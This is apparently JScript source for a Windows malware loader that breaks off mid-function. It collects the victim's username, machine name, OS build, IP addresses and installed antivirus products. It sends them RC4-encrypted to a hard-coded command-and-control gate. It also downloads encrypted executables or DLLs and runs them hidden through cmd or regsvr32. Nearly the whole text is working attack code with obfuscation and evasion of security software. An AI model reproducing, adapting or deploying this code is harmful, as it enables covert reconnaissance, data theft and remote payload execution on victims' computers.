var BV = "2.0";
var Gate = "https://api.toshiba.org.kz/v1";
var js_gate = "https://api.toshiba.org.kz/robots.txt";
var hit_each = 10;
var error_retry = 2;
var restart_h = 4;
var rcon_max = hit_each * (restart_h * 60) / (hit_each * hit_each);
var Rkey = "TulME29AZsH47hID";
var rcon_now = 0;
var User = "";
var Build = "";
var gtfo = false;

function obj(xString) { return new ActiveXObject(xString);}

function gObj() { var objMain; try{ objMain = GetObject("winmgmts:{impersonationLevel=impersonate}"); return objMain; } catch(wtf111){return false;}  }

var con;try { con = obj("Msxml2.XMLHTTP.6.0");} catch (e) { try {con = obj("Msxml2.XMLHTTP.3.0");} catch (e2) {con = obj("Microsoft.XMLHTTP");}}
var xhr;try { xhr = obj("Msxml2.ServerXMLHTTP.6.0");} catch (e3) {xhr = obj("Msxml2.ServerXMLHTTP.3.0");}

function fexist(xpath) {
var fso;
try {
fso = obj("Scripting.FileSystemObject");
if (fso.FileExists(xpath)) {return true;} else {return false;}
} catch (feer) {return false;}
}

function myEnv(xVar, xSystem)
{
var a1;var rEnv;
a1 = obj("WScript.Shell");
if (xSystem === 1)
{
rEnv = a1.environment("SYSTEM");
}else{
rEnv = a1.environment("PROCESS");
}
return rEnv(xVar);
}

var xApp = myEnv("APPDATA", 0);

function myBits()
{
var xBits;
xBits = myEnv("PROCESSOR_ARCHITECTURE", 1);
if (xBits === "AMD64")
{
return "64";
}else{
return "86";
}
}

function zzzz4(key, str) {
	var s = [];var j = 0;var x;var res = "";var i;var y;
if(key && str)
{
	i = 0;
	do
	{
		s[i] = i;
		i += 1;
	} while (i<256);
	
	i = 0;
	do
	{
		j = (j + s[i] + key.charCodeAt(i % key.length)) % 256;
		x = s[i];
		s[i] = s[j];
		s[j] = x;
		i += 1;
	} while (i<256);
	
	i = 0;
	j = 0;

	y = 0;
	do
	{
		i = (i + 1) % 256;
		j = (j + s[i]) % 256;
		x = s[i];
		s[i] = s[j];
		s[j] = x;
		res += String.fromCharCode(str.charCodeAt(y) ^ s[(s[i] + s[j]) % 256]);
		y += 1;
	} while (y<str.length);
}
	return res;
}

function rc4Bytes(xArray, key) {var s = [];var j = 0;var x;var outBytes = [];var i;var y;

if (key && xArray)
{

i = 0;
do
{
	s[i] = i;
	i += 1;
} while (i<256);

i = 0;
do
{
	j = (j + s[i] + key.charCodeAt(i % key.length)) % 256;x = s[i];s[i] = s[j];s[j] = x;
	i += 1;
} while (i<256);

i = 0;j = 0; y = 0;

do
{
	i = (i + 1) % 256;j = (j + s[i]) % 256;x = s[i];s[i] = s[j];s[j] = x;outBytes.push(xArray[y] ^ s[(s[i] + s[j]) % 256]);
	y += 1;
} while (y<xArray.length);

}

return outBytes;
}

function tB(htc) 
{
var y = []; y[0xC7] = 0x80; y[0xFC] = 0x81; y[0xE9] = 0x82; y[0xE2] = 0x83; y[0xE4] = 0x84; y[0xE0] = 0x85; y[0xE5] = 0x86; y[0xE7] = 0x87; y[0xEA] = 0x88; y[0xEB] = 0x89; y[0xE8] = 0x8A; y[0xEF] = 0x8B; y[0xEE] = 0x8C; y[0xEC] = 0x8D; y[0xC4] = 0x8E; y[0xC5] = 0x8F; y[0xC9] = 0x90; y[0xE6] = 0x91; y[0xC6] = 0x92; y[0xF4] = 0x93; y[0xF6] = 0x94; y[0xF2] = 0x95; y[0xFB] = 0x96; y[0xF9] = 0x97; y[0xFF] = 0x98; y[0xD6] = 0x99; y[0xDC] = 0x9A; y[0xA2] = 0x9B; y[0xA3] = 0x9C; y[0xA5] = 0x9D; y[0x20A7] = 0x9E; y[0x192] = 0x9F; y[0xE1] = 0xA0; y[0xED] = 0xA1; y[0xF3] = 0xA2; y[0xFA] = 0xA3; y[0xF1] = 0xA4; y[0xD1] = 0xA5; y[0xAA] = 0xA6; y[0xBA] = 0xA7; y[0xBF] = 0xA8; y[0x2310] = 0xA9; y[0xAC] = 0xAA; y[0xBD] = 0xAB; y[0xBC] = 0xAC; y[0xA1] = 0xAD; y[0xAB] = 0xAE; y[0xBB] = 0xAF; y[0x2591] = 0xB0; y[0x2592] = 0xB1; y[0x2593] = 0xB2; y[0x2502] = 0xB3; y[0x2524] = 0xB4; y[0x2561] = 0xB5; y[0x2562] = 0xB6; y[0x2556] = 0xB7; y[0x2555] = 0xB8; y[0x2563] = 0xB9; y[0x2551] = 0xBA; y[0x2557] = 0xBB; y[0x255D] = 0xBC; y[0x255C] = 0xBD; y[0x255B] = 0xBE; y[0x2510] = 0xBF; y[0x2514] = 0xC0; y[0x2534] = 0xC1; y[0x252C] = 0xC2; y[0x251C] = 0xC3; y[0x2500] = 0xC4; y[0x253C] = 0xC5; y[0x255E] = 0xC6; y[0x255F] = 0xC7; y[0x255A] = 0xC8; y[0x2554] = 0xC9; y[0x2569] = 0xCA; y[0x2566] = 0xCB; y[0x2560] = 0xCC; y[0x2550] = 0xCD; y[0x256C] = 0xCE; y[0x2567] = 0xCF; y[0x2568] = 0xD0; y[0x2564] = 0xD1; y[0x2565] = 0xD2; y[0x2559] = 0xD3; y[0x2558] = 0xD4; y[0x2552] = 0xD5; y[0x2553] = 0xD6; y[0x256B] = 0xD7; y[0x256A] = 0xD8; y[0x2518] = 0xD9; y[0x250C] = 0xDA; y[0x2588] = 0xDB; y[0x2584] = 0xDC; y[0x258C] = 0xDD; y[0x2590] = 0xDE; y[0x2580] = 0xDF; y[0x3B1] = 0xE0; y[0xDF] = 0xE1; y[0x393] = 0xE2; y[0x3C0] = 0xE3; y[0x3A3] = 0xE4; y[0x3C3] = 0xE5; y[0xB5] = 0xE6; y[0x3C4] = 0xE7; y[0x3A6] = 0xE8; y[0x398] = 0xE9; y[0x3A9] = 0xEA; y[0x3B4] = 0xEB; y[0x221E] = 0xEC; y[0x3C6] = 0xED; y[0x3B5] = 0xEE; y[0x2229] = 0xEF; y[0x2261] = 0xF0; y[0xB1] = 0xF1; y[0x2265] = 0xF2; y[0x2264] = 0xF3; y[0x2320] = 0xF4; y[0x2321] = 0xF5; y[0xF7] = 0xF6; y[0x2248] = 0xF7; y[0xB0] = 0xF8; y[0x2219] = 0xF9; y[0xB7] = 0xFA; y[0x221A] = 0xFB; y[0x207F] = 0xFC; y[0xB2] = 0xFD; y[0x25A0] = 0xFE; y[0xA0] = 0xFF; var ami = [];var mi;var renderer;var atends;

mi = 0;
do
{
	renderer=htc.charCodeAt(mi); if (renderer < 128){atends=renderer;}else{atends=y[renderer];}ami.push(atends); 
	mi += 1;
} while (mi<htc.length);

return ami; 

}

function tS(arenderer) { var x = []; x[0x80] = 0x00C7; x[0x81] = 0x00FC; x[0x82] = 0x00E9; x[0x83] = 0x00E2; x[0x84] = 0x00E4; x[0x85] = 0x00E0; x[0x86] = 0x00E5; x[0x87] = 0x00E7; x[0x88] = 0x00EA; x[0x89] = 0x00EB; x[0x8A] = 0x00E8; x[0x8B] = 0x00EF; x[0x8C] = 0x00EE; x[0x8D] = 0x00EC; x[0x8E] = 0x00C4; x[0x8F] = 0x00C5; x[0x90] = 0x00C9; x[0x91] = 0x00E6; x[0x92] = 0x00C6; x[0x93] = 0x00F4; x[0x94] = 0x00F6; x[0x95] = 0x00F2; x[0x96] = 0x00FB; x[0x97] = 0x00F9; x[0x98] = 0x00FF; x[0x99] = 0x00D6; x[0x9A] = 0x00DC; x[0x9B] = 0x00A2; x[0x9C] = 0x00A3; x[0x9D] = 0x00A5; x[0x9E] = 0x20A7; x[0x9F] = 0x0192; x[0xA0] = 0x00E1; x[0xA1] = 0x00ED; x[0xA2] = 0x00F3; x[0xA3] = 0x00FA; x[0xA4] = 0x00F1; x[0xA5] = 0x00D1; x[0xA6] = 0x00AA; x[0xA7] = 0x00BA; x[0xA8] = 0x00BF; x[0xA9] = 0x2310; x[0xAA] = 0x00AC; x[0xAB] = 0x00BD; x[0xAC] = 0x00BC; x[0xAD] = 0x00A1; x[0xAE] = 0x00AB; x[0xAF] = 0x00BB; x[0xB0] = 0x2591; x[0xB1] = 0x2592; x[0xB2] = 0x2593; x[0xB3] = 0x2502; x[0xB4] = 0x2524; x[0xB5] = 0x2561; x[0xB6] = 0x2562; x[0xB7] = 0x2556; x[0xB8] = 0x2555; x[0xB9] = 0x2563; x[0xBA] = 0x2551; x[0xBB] = 0x2557; x[0xBC] = 0x255D; x[0xBD] = 0x255C; x[0xBE] = 0x255B; x[0xBF] = 0x2510; x[0xC0] = 0x2514; x[0xC1] = 0x2534; x[0xC2] = 0x252C; x[0xC3] = 0x251C; x[0xC4] = 0x2500; x[0xC5] = 0x253C; x[0xC6] = 0x255E; x[0xC7] = 0x255F; x[0xC8] = 0x255A; x[0xC9] = 0x2554; x[0xCA] = 0x2569; x[0xCB] = 0x2566; x[0xCC] = 0x2560; x[0xCD] = 0x2550; x[0xCE] = 0x256C; x[0xCF] = 0x2567; x[0xD0] = 0x2568; x[0xD1] = 0x2564; x[0xD2] = 0x2565; x[0xD3] = 0x2559; x[0xD4] = 0x2558; x[0xD5] = 0x2552; x[0xD6] = 0x2553; x[0xD7] = 0x256B; x[0xD8] = 0x256A; x[0xD9] = 0x2518; x[0xDA] = 0x250C; x[0xDB] = 0x2588; x[0xDC] = 0x2584; x[0xDD] = 0x258C; x[0xDE] = 0x2590; x[0xDF] = 0x2580; x[0xE0] = 0x03B1; x[0xE1] = 0x00DF; x[0xE2] = 0x0393; x[0xE3] = 0x03C0; x[0xE4] = 0x03A3; x[0xE5] = 0x03C3; x[0xE6] = 0x00B5; x[0xE7] = 0x03C4; x[0xE8] = 0x03A6; x[0xE9] = 0x0398; x[0xEA] = 0x03A9; x[0xEB] = 0x03B4; x[0xEC] = 0x221E; x[0xED] = 0x03C6; x[0xEE] = 0x03B5; x[0xEF] = 0x2229; x[0xF0] = 0x2261; x[0xF1] = 0x00B1; x[0xF2] = 0x2265; x[0xF3] = 0x2264; x[0xF4] = 0x2320; x[0xF5] = 0x2321; x[0xF6] = 0x00F7; x[0xF7] = 0x2248; x[0xF8] = 0x00B0; x[0xF9] = 0x2219; x[0xFA] = 0x00B7; x[0xFB] = 0x221A; x[0xFC] = 0x207F; x[0xFD] = 0x00B2; x[0xFE] = 0x25A0; x[0xFF] = 0x00A0;  var bb = [];var leppek=""; var atends;var renderer;var mi;

mi = 0;
do
{
atends=arenderer[mi];if (atends < 128) {renderer=atends;}else {renderer=x[atends];}bb.push(String.fromCharCode(renderer));
mi += 1;
} while (mi<arenderer.length);

leppek=bb.join(""); return leppek; }

function mZcheck(arenderer) {if (arenderer[0] === 0x4D && arenderer[1] === 0x5a){return true;} else{return false;}}

function tempExtra()
{
  return Math.floor(Math.random() * 65536);
}

function tempNow()
{
  var fso2;var t1;

  try{
  fso2 = obj("Scripting.FileSystemObject");
  t1 = fso2.GetTempName();
  if(t1)
  {
    return t1;
  }else{
     return tempExtra() + ".tmp";
  }
}catch(e0){return tempExtra() + ".tmp";}

}

function deleteFile(filespec)
{
try{
   var fso;
   fso = obj("Scripting.FileSystemObject");
   if (fso.FileExists(filespec))
   {
	fso.DeleteFile(filespec);
   }
}catch(e8){return false;}
}

function osversion2() {
var oShell;var vStr; var vSplit = {};var Temp1;var vRet = "";var rFile = "";
var fso2; var file3; var xY = '"';
var cName = "Windows ";
var Vers1 = "6.1.";
var Vers2 = "5.1.";
var Vers3 = "6.0.";
var Vers4 = "6.2.";
var Vers5 = "6.3.";
var Vers6 = "10.0.";
var Vers7 = "5.2.";
var xNow = "";

try {
	oShell = obj("Wscript.Shell");
	fso2 = obj("Scripting.FileSystemObject");

	rFile = myEnv("TMP", 0) + "\\" + tempNow();

	oShell.run("%comspec% /c ver > " + xY + rFile + xY, 0, 1);

	file3 = fso2.OpenTextFile(rFile, 1, 1);

	if (!file3.AtEndOfStream)
	{
	vStr = file3.ReadAll();
	file3.Close();

	deleteFile(rFile);

	if (vStr) {
	vStr = vStr.replace(/(\r\n|\n|\r)/gm,"");

	if (vStr.indexOf(Vers2) !== -1)
	{ vRet = "XP"; xNow = Vers2;}

	if (!vRet){
	if (vStr.indexOf(Vers3) !== -1)
	{ vRet = "Vista"; xNow = Vers3;}
	}

	if (!vRet){
	if (vStr.indexOf(Vers1) !== -1)
	{ vRet = "7"; xNow = Vers1;}
	}

	if (!vRet){
	if (vStr.indexOf(Vers4) !== -1)
	{ vRet = "8";xNow = Vers4;}
	}

	if (!vRet){
	if (vStr.indexOf(Vers5) !== -1)
	{ vRet = "8.1";xNow = Vers5; }
	}

	if (!vRet){
	if (vStr.indexOf(Vers6) !== -1)
	{ vRet = "10";xNow = Vers6;}  
	}

	if (!vRet){
	if (vStr.indexOf(Vers7) !== -1)
	{ vRet = "Server 2003";xNow = Vers7;}  
	}

	if (xNow)
	{
	vSplit = vStr.split(xNow);

	if(vSplit[1])
	{
	Temp1 = vSplit[1];

	if (Temp1.replace("]", "") != Temp1)
	{
	Build = Temp1.replace("]", "");
	}

	}

	}

	if (!vRet){
	return vStr;
	} else {
	return cName + vRet;
	}

	} else {return "COM_error_2";} 

	} else { return "COM_error_5";}
	
} catch(eg1) { return "COM_error_6"; }

}

function local_ip2() {
var x = '"'; var oShell; var vStr = ""; var fso; var file2; var xRet = ""; var xNow = "";
var vSplit = {}; var xSplit = {}; var i; var rFile = ""; var xipnow = "";

try {
oShell = obj("Wscript.Shell");
fso = obj("Scripting.FileSystemObject");

rFile = myEnv("TMP", 0) + "\\" + tempNow();

oShell.run("%comspec% /c ipconfig | findstr /R /C:" + x + "IPv4 Address" + x + " > " + x + rFile + x, 0, 1);

file2 = fso.OpenTextFile(rFile, 1, 1);

if (!file2.AtEndOfStream)
{

vStr = file2.ReadAll();
file2.Close();

deleteFile(rFile);

if (vStr)
{

	vSplit = vStr.split(/\r?\n/);
	
		if (vSplit.length >= 0)
		{
			i = 0;
			do 
			{
			xNow = vSplit[i];
			
			if (xNow)
				{
				xSplit = xNow.split(": ");
				
					if (xSplit.length === 2)
					{
						xipnow = xSplit[1];
						
						if (xipnow && xRet.indexOf(xipnow) == -1 && xipnow !== "0.0.0.0")
						{
							xRet = xRet + xipnow + ",";
						}
					}
				
				}
			i += 1;
			} while (i<vSplit.length);
			
			vSplit = {};
			xSplit = {};
			
			xRet = xRet.substring(0, xRet.length - 1);
			
			return xRet;
		}
	
}

} else { return "127.0.0.1";}

} catch(e891) {return "127.0.0.1"; }

}

function local_IP()
{
var wmi3; var wmiC3; var eN2; var itemNow2; var ipnow = ""; var lRet = "";

wmi3 = gObj();

if (wmi3 !== false)
{

 try {
	wmiC3 = wmi3.ExecQuery("SELECT * FROM Win32_NetworkAdapterConfiguration WHERE IPEnabled = True");

	eN2 = new Enumerator(wmiC3);

	while (eN2.atEnd() === false) {
	itemNow2 = eN2.item(); 
	ipnow = itemNow2.IPAddress(0);

	if (ipnow)
	{
	if (lRet.indexOf(ipnow) == -1)
	{
	lRet = lRet + ipnow + ",";
	}
	}

	eN2.moveNext();
	}

	if (lRet)
	{
		lRet = lRet.substring(0, lRet.length - 1);

		return lRet;
	}
  } catch(e7171) { return "127.0.0.1";}
  
} else {
return "127.0.0.1";
}

}

function cAV(){
var pList = [];var i = 0;var rAV = "";var itemNow;var ExeNow = "";var wmi2;var wmiC2;var eN;
var fso; var rFile = ""; var oShell; var file4; var vStr = ""; var xG = '"'; var tList = {}; var tL2 = {};
var rExe = ""; var g = 0; var x;var pNow = "";

wmi2 = gObj();
var ey = ".exe";

try {
	if (wmi2 !== false)
	{
		wmiC2 = wmi2.ExecQuery("SELECT Name FROM Win32_Process");

		eN = new Enumerator(wmiC2);

		while (eN.atEnd() === false) {
			
			itemNow = eN.item();
			
			if (itemNow)
			{
				ExeNow = itemNow.Name;

				if (ExeNow.indexOf(ey) !== -1 && ExeNow !== "svchost" + ey)
				{
				pList[i] = ExeNow;
				i += 1;
				}
			}
		eN.moveNext();
		}
	} else {
		oShell = obj("Wscript.Shell");
		fso = obj("Scripting.FileSystemObject");
		
		rFile = myEnv("TMP", 0) + "\\" + tempNow();
		oShell.run("%comspec% /c tasklist /FO CSV /NH > " + xG + rFile + xG, 0, 1);
		
		file4 = fso.OpenTextFile(rFile, 1, 1);
		
		if (!file4.AtEndOfStream)
		{
			vStr = file4.ReadAll();
			file4.Close();

			deleteFile(rFile);
			
			tList = vStr.split(/\r?\n/);
			
			i = 0;
			do 
			{
				ExeNow = tList[i];
				tL2 = ExeNow.split('"');
				
				if (tL2.length >= 2)
				{
					rExe = tL2[1];
					
					if (rExe.indexOf(ey) !== -1 && rExe !== "svchost" + ey)
					{
						pList[g] = rExe;
						g += 1;
						
					}
				}
				i += 1;
				
			} while (i<tList.length);
			
			tList = {};
			tL2 = {} ;
		}

	}
} catch (eav1) { return "Av_err";}

if (pList.length >= 5){

var v1 = "Windows Defender";
var v2 = "McAfee";
var v4 = "Avast";
var v5 = "Avira";
var v6 = "AVG";
var v7 = "TrendMicro";
var v8 = "Panda";
var v9 = "F-Secure";
var v10 = "Kaspersky";
var v11 = "Symantec";
var v12 = "Sophos";
var v13 = "Bitdefender";
var v14 = "ESET";
var v15 = "Comodo";
var v16 = "MalwareBytes";
var v17 = "Norton";
var v18 = "ClamAV";
var v19 = "TrusteerRapport";
var v20 = "DeepFreeze";
var v21 = "360 Total Security";
var v22 = "Seqrite Endpoint Security";
var v23 = "Quick Heal";
var v24 = "Fortinet";
var v25 = "Bitdefender Endpoint Security";
var v26 = "ByteFence";
var v27 = "G-Data";
var v28 = "Webroot";

x = 0;
ey = ey.toUpperCase();
do
{
pNow = pList[x].toUpperCase();
  switch (pNow){
	 case "MSMPENG" + ey:
	   if (rAV.indexOf(v1) === -1)
	   {
	   rAV += v1 + ",";
	   }
	   break;
	 case "MSSECES" + ey:
	   if (rAV.indexOf(v1) === -1)
	   {
	   rAV += v1 + ",";
	   }
	   break;
	 case "MCTRAY" + ey:
	   if (rAV.indexOf(v2) === -1)
	   {
	   rAV += v2 + ",";
	   }
	   break;
	 case "MCSHIELD" + ey:
	   if (rAV.indexOf(v2) === -1)
	   {
	   rAV += v2 + ",";
	   }
	   break;
	 case "SSSCHEDULER" + ey:
	   if (rAV.indexOf(v2) === -1)
	   {
	   rAV += v2 + ",";
	   }
	   break;
	 case "MCAPEXE" + ey:
	   if (rAV.indexOf(v2) === -1)
	   {
	   rAV += v2 + ",";
	   }
	   break;
	 case "ASHSERV" + ey:
	   if (rAV.indexOf(v4) === -1)
	   {
	   rAV += v4 + ",";
	   }
	   break;
	 case "AVASTSVC" + ey:
	   if (rAV.indexOf(v4) === -1)
	   {
	   rAV += v4 + ",";
	   }
	   break;
	 case "AVGUARD" + ey:
	   if (rAV.indexOf(v5) === -1)
	   {
	   rAV += v5 + ",";
	   }
	   break;
	 case "AVGEMCA" + ey:
	   if (rAV.indexOf(v6) === -1)
	   {
	   rAV += v6 + ",";
	   }
	   break;
	 case "AVGRSX" + ey:
	   if (rAV.indexOf(v6) === -1)
	   {
	   rAV += v6 + ",";
	   }
	   break;
	 case "AVGSVCA" + ey:
	   if (rAV.indexOf(v6) === -1)
	   {
	   rAV += v6 + ",";
	   }
	   break;
	 case "TMBMSRV" + ey:
	   if (rAV.indexOf(v7) === -1)
	   {
	   rAV += v7 + ",";
	   }
	   break;
	 case "TMNTSRV" + ey:
	   if (rAV.indexOf(v7) === -1)
	   {
	   rAV += v7 + ",";
	   }
	   break;
	 case "PCCNTMON" + ey:
	   if (rAV.indexOf(v7) === -1)
	   {
	   rAV += v7 + ",";
	   }
	   break;
	 case "PTSVCHOST" + ey:
	   if (rAV.indexOf(v7) === -1)
	   {
	   rAV += v7 + ",";
	   }
	   break;
	 case "AVENGINE" + ey:
	   if (rAV.indexOf(v8) === -1)
	   {
	   rAV += v8 + ",";
	   }
	   break;
	 case "PSANHOST" + ey:
	   if (rAV.indexOf(v8) === -1)
	   {
	   rAV += v8 + ",";
	   }
	   break;
	 case "FSAV32" + ey:
	   if (rAV.indexOf(v9) === -1)
	   {
	   rAV += v9 + ",";
	   }
	   break;
	 case "FSHOSTER32" + ey:
	   if (rAV.indexOf(v9) === -1)
	   {
	   rAV += v9 + ",";
	   }
	   break;
	 case "FSGK32ST" + ey:
	   if (rAV.indexOf(v9) === -1)
	   {
	   rAV += v9 + ",";
	   }
	   break;
	 case "AVP" + ey:
	   if (rAV.indexOf(v10) === -1)
	   {
	   rAV += v10 + ",";
	   }
	   break;
	 case "CCSVCHST" + ey:
	   if (rAV.indexOf(v11) === -1)
	   {
	   rAV += v11 + ",";
	   }
	   break;
	 case "SAVSERVICE" + ey:
	   if (rAV.indexOf(v12) === -1)
	   {
	   rAV += v12 + ",";
	   }
	   break;
	 case "VSSERV" + ey:
	   if (rAV.indexOf(v13) === -1)
	   {
	   rAV += v13 + ",";
	   }
	   break;
	 case "BDSS" + ey:
	   if (rAV.indexOf(v13) === -1)
	   {
	   rAV += v13 + ",";
	   }
	   break;
	 case "GZSERV" + ey:
	   if (rAV.indexOf(v13) === -1)
	   {
	   rAV += v13 + ",";
	   }
	   break;
	 case "EKRN" + ey:
	   if (rAV.indexOf(v14) === -1)
	   {
	   rAV += v14 + ",";
	   }
	   break;
	 case "CMDAGENT" + ey:
	   if (rAV.indexOf(v15) === -1)
	   {
	   rAV += v15 + ",";
	   }
	   break;
	 case "MBAMSERVICE" + ey:
	   if (rAV.indexOf(v16) === -1)
	   {
	   rAV += v16 + ",";
	   }
	   break;
	 case "NST" + ey:
	   if (rAV.indexOf(v17) === -1)
	   {
	   rAV += v17 + ",";
	   }
	   break;
	 case "NS" + ey:
	   if (rAV.indexOf(v17) === -1)
	   {
	   rAV += v17 + ",";
	   }
	   break;
	 case "NSBU" + ey:
	   if (rAV.indexOf(v17) === -1)
	   {
	   rAV += v17 + ",";
	   }
	   break;
	 case "NIS" + ey:
	   if (rAV.indexOf(v17) === -1)
	   {
	   rAV += v17 + ",";
	   }
	   break;
	 case "CLAMTRAY" + ey:
	   if (rAV.indexOf(v18) === -1)
	   {
	   rAV += v18 + ",";
	   }
	   break;
	 case "RAPPORTMGMTSERVICE" + ey:
	   if (rAV.indexOf(v19) === -1)
	   {
	   rAV += v19 + ",";
	   }
	   break;
	 case "FRZSTATE2K" + ey:
	   if (rAV.indexOf(v20) === -1)
	   {
	   rAV += v20 + ",";
	   }
	   break;
	 case "QHACTIVEDEFENSE" + ey:
	   if (rAV.indexOf(v21) === -1)
	   {
	   rAV += v21 + ",";
	   }
	   break;
	 case "SAPISSVC" + ey:
	   if (rAV.indexOf(v22) === -1)
	   {
	   rAV += v22 + ",";
	   }
	   break;
	 case "QUHLPSVC" + ey:
	   if (rAV.indexOf(v23) === -1)
	   {
	   rAV += v23 + ",";
	   }
	   break;
	 case "FCDBLOG" + ey:
	   if (rAV.indexOf(v24) === -1)
	   {
	   rAV += v24 + ",";
	   }
	   break;
	 case "EPSECURITYSERVICE" + ey:
	   if (rAV.indexOf(v25) === -1)
	   {
	   rAV += v25 + ",";
	   }
	   break;
	 case "RTOP_SVC" + ey:
	   if (rAV.indexOf(v26) === -1)
	   {
	   rAV += v26 + ",";
	   }
	   break;
	 case "GDAGENTSRV" + ey:
	   if (rAV.indexOf(v27) === -1)
	   {
	   rAV += v27 + ",";
	   }
	   break;
	 case "WRSA" + ey:
	   if (rAV.indexOf(v28) === -1)
	   {
	   rAV += v28 + ",";
	   }
	   break;
  }

x += 1;

} while (x<pList.length);

pList = [];

if (rAV.length >= 3)
{

  if (rAV.substring(rAV.length-1) === ",")
  {
    rAV = rAV.substring(0, rAV.length-1);
  }

}else{rAV = "Unknown";}

}else{rAV = "Unknown";}

return rAV;
}

function bot_header(){
var wiV = "";var UN = "";var CN = "";var tOS = "";var lIP = ""; var av_Now = "";
try {
var WN = obj("WScript.Network");
UN = WN.UserName;
CN = WN.ComputerName;
} catch(e7) {
UN = "un_error";
CN = "cn_error";
}

User = UN;
lIP = local_IP();

if (lIP == "127.0.0.1")
{
	lIP = local_ip2();
}

av_Now = cAV();

var pack = "";var bits = "";var HW1 = "";var Caption = "";var bNumber = "";var Profile;var g1;var xy;var wmi1;var wmiC;
var r1 = "Microsoft ";

wmi1 = gObj();

if (wmi1 !== false)
{
wmiC = wmi1.ExecQuery("select * from Win32_OperatingSystem");

xy = new Enumerator(wmiC);

while (xy.atEnd() === false)
{
   Profile = xy.item();
   
   pack = Profile.ServicePackMajorVersion;

   if(pack){
	pack = " SP " + Profile.ServicePackMajorVersion + "." + Profile.ServicePackMinorVersion;
   }
   
   bits = Profile.OSArchitecture;
   if (!bits){
       bits = "86";
   }else{
      g1 = bits.substr(0,2);
      if (g1 === "32")
      {
         bits = "86";
      }else{
         bits = "64";
      }
   }
   
   HW1 = Profile.SerialNumber;
   if(!HW1)
   {
     HW1 = "skid1337";
   }
   
   Caption = Profile.Caption;
   if (!Caption)
   {
     Caption = "Windows/error";
   }else{
     if (Caption.indexOf(r1) !== -1)
	    {
	      Caption = Caption.replace(r1, "");
	    }
	 }
   
   bNumber = Profile.BuildNumber;
   if (!bNumber){
     bNumber = "";
   }
   
xy.moveNext();
}

wiV = bNumber + pack;

if (!wiV){wiV = "0";}

return "[hwid1]" + HW1 + "[/hwid1][protection]" + av_Now + "[/protection][username]" + UN + "[/username][pcname]" + CN + "[/pcname][os]" + Caption + "[/os][osbuild]" + wiV + "[/osbuild][osbits]" + bits + "[/osbits][localip]" + lIP + "[/localip][version]" + BV + "[/version]";

} else {
tOS = osversion2();

if (!Build){Build = "0";}
return "[hwid1]skid65536[/hwid1][protection]" + av_Now + "[/protection][username]" + UN + "[/username][pcname]" + CN + "[/pcname][os]" + tOS + "[/os][osbuild]" + Build + "[/osbuild][osbits]" + myBits() + "[/osbits][localip]" + lIP + "[/localip][version]" + BV + "[/version]";
}

}

var PreserveH = bot_header();
var xStore = "HKEY_CURRENT_USER\\Software\\Microsoft\\Notepad\\" + User;

function getRandomIntInclusive(min, max) {
  min = Math.ceil(min);
  max = Math.floor(max);
  return Math.floor(Math.random() * (max - min + 1)) + min;
}

function randomString(len) {
    var xRnd = "";var i;var randomPoz;
    var charSet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
	i = 0;
	do
	{
    	randomPoz = Math.floor(Math.random() * charSet.length);
    	xRnd += charSet.substring(randomPoz, randomPoz+1);
		i += 1;
    } while (i<len);
	
    return xRnd;
}

function fuck_js(){
var xNow = getRandomIntInclusive(8, 16);
var rNow = randomString(xNow);
try{
  xhr.setTimeouts(5000, 5000, 10000, 10000);
  
  xhr.open("GET", "http://8.8.8.8/" + rNow, false);
  xhr.send();
  
}catch(e9){return false;}

}

function waitfor(zMinute){
   var limit = Date.parse(Date()) + (zMinute * 60000);
   
   while(Date.parse(Date()) < limit){
	  fuck_js();
   }
   mainSkid();
}

function hit_Gate(URL, POSTdata, gResponse){
var Resp="";var Temp89="";

try{
con.open("POST", URL, false);
}catch(e10){return "GateError";}

if (gResponse === 1){
con.onreadystatechange=function() {
  if (con.readyState === 4) {
   if(con.status === 200){
   Temp89 = con.responseText;
   if(Temp89)
       {
       var wo = Temp89.substr(0, Temp89.length -2);
       var KeyNow = Temp89.substr(Temp89.length -2);
       Resp = zzzz4(Rkey + KeyNow, wo);
       }else{Resp = "OK";}
   }else{Resp= "GateError";}
  
  }
};
}

  var keynow = randomString(2);
  var rNow = getRandomIntInclusive(8, 32);
  var not_unique = POSTdata + "[not_really_random]" + randomString(rNow) + "[/not_really_random]";
  var xCrypted = zzzz4(Rkey + keynow, not_unique) + keynow;

try{con.send(xCrypted);}catch(e11){Resp = "GateError";}

if (gResponse === 1){return Resp;}

}

function get_string_between(s, prefix, suffix){
  var i = s.indexOf(prefix);
  if (i >= 0) {
    s = s.substring(i + prefix.length);
  }else {return "";}
  if (suffix) {
    i = s.indexOf(suffix);
    if (i >= 0) {
      s = s.substring(0, i);
    }
    else {return "";}
  }
  return s;
}

function dExec(zURL, myKey, xPE){
var con2 = con;var ret2 = "";var Final;

try{
con2.open("GET", zURL, false);
}catch(e16){return "Error";}

con2.onreadystatechange=function() {
if (con2.readyState === 4){
if (con2.status === 200){

var adb = obj("ADODB.Stream");
adb.open();
adb.type = 1;
adb.write(con2.responsebody);

adb.position = 0;
adb.Type = 2;
adb.Charset = 437;
var binVariant = adb.ReadText();
if (binVariant) {

var ByteArray = tB(binVariant);
var xDecrypted = rc4Bytes(ByteArray, myKey);

if (mZcheck(xDecrypted))
{
var wsh = obj("wscript.shell");

if (xPE === "exe")
{
Final = xApp + "\\" + tempNow();
}

if (xPE === "dll")
{
Final = xApp + "\\" + tempExtra() + ".txt";
}

var dq = "\x22";

adb.position = 0;
adb.type = 2;
adb.Charset = 437;

adb.writeText(tS(xDecrypted));
adb.savetofile(Final);
adb.close();

if (xPE === "exe")
{
var command = "cmd.exe /c START " + dq + dq + " " + dq + Final + dq;

try{wsh.run(command, 0, 0);ret2 = "OK";} catch(e4) { ret2 = "Error";}
}

if (xPE === "dll")
{

var Mitm_exe = "regsvr32.exe";

if (Final)
{

var path1 = myEnv("SYSTEMROOT", 0);

if (myBits() === "64")
{
path1 += "\\SysWOW64\\" + Mitm_exe;
} else {
path1 += "\\System32\\" + Mitm_exe;
}

path1 += " /s " + dq + Final + dq;

try{wsh.run(path1, 0, 0);ret2 = "OK";} catch(e441) { ret2 = "Error";}

} else {ret2 = "Error";}
}

} else { ret2 = "Error";}
} else { ret2 = "Error";}
} else { ret2 = "Error";}

}
};

try {con2.send();} catch(e5) {ret2 = "Error";}

return ret2;
}

function wget(URL, SaveTo, rc4Key){
var con3 = con;var ret3 = "";

try{con3.open("GET", URL, false);}catch(e14){return "Error";}

con3.onreadystatechange=function() {
  if (con3.readyState === 4){
      if(con3.status === 200){
	  var adb = obj("ADODB.Stream");
	  adb.open();
	  adb.type = 1;
